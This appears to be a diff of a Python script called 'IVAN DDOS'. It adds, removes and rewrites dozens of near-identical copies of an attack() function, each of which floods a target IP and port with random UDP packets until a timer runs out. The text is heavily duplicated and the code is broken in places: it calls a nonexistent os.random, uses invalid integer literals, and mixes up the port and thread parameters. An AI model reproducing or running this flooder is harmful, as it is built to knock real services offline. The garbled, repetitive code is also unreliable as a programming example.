-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -14221,7 +12905,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -14253,7 +12937,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -14285,7 +12969,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -14317,7 +13001,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -14349,7 +13033,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -14375,7 +13059,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -14407,39 +13091,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -14471,7 +13123,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -14503,415 +13155,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -14943,225 +13187,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -15537,7 +13563,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -15569,7 +13595,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -15601,7 +13627,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -15633,7 +13659,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -15665,7 +13691,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -15691,7 +13717,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -15723,39 +13749,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -15787,7 +13781,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -15819,415 +13813,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
